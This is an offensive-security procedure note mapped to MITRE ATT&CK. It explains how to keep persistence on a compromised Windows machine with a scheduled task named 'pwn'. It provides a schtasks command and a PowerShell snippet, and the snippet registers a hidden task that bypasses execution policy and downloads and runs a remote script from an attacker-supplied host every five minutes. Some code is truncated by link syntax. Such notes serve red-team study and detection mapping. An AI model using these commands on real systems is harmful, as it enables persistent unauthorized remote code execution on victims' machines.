---
id: a31b8c81-1465-4c21-8316-94fc34706b81
name: Create a Windows Scheduled Task
type: procedure
verified: true
submitted: true
created_at: '2020-03-13T01:36:22.842340+00:00'
updated_at: '2023-05-25T20:02:42.073114+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Scheduled Task|T1053 - Scheduled Task]]'
platforms:
- Windows
tags:
- '[[persistence]]'
commands:
- '[[schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd]]'
- '[[Command Shell Scheduled Task Repeating Every 5 Minutes]]'
- '[[PowerShell Scheduled Task Repeating Every 5 Minutes]]'
---

# Create a Windows Scheduled Task

**Status**: ✓ Verified

## Summary

Creating a scheduled task is a popular way of maintaining persistence on a compromised machine. 

## Description

# Description

Creating a scheduled task is a popular way of maintaining persistence on a compromised machine.

# Instructions

## Command Prompt

1. Create a .bat script for the task to execute. This is done to avoid problematic characters when creating the task itself. The script in this procedure downloads and executes a PowerShell script from a remote server.

**Code**: [[@ECHO OFF
powershell.exe -ep bypass -windowstyle h]]

The script is placed in C:\Windows\Tasks\shell.bat

2. Create a Scheduled Task which executes the script every 5 minutes

**Command** ([[schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd]]):

```bash
schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\Windows\Tasks\shell.bat"
```

## PowerShell

Create the scheduled action, then set the trigger. In this procedure, a PowerShell script is downloaded and executed from a remote server.

**Command** ([[PowerShell Scheduled Task Repeating Every 5 Minutes]]):

```bash
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Scheduled Task|T1053 - Scheduled Task]]

## Commands Used

- [[schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd]]
- [[Command Shell Scheduled Task Repeating Every 5 Minutes]]
- [[PowerShell Scheduled Task Repeating Every 5 Minutes]]

## Tags

- [[persistence]]
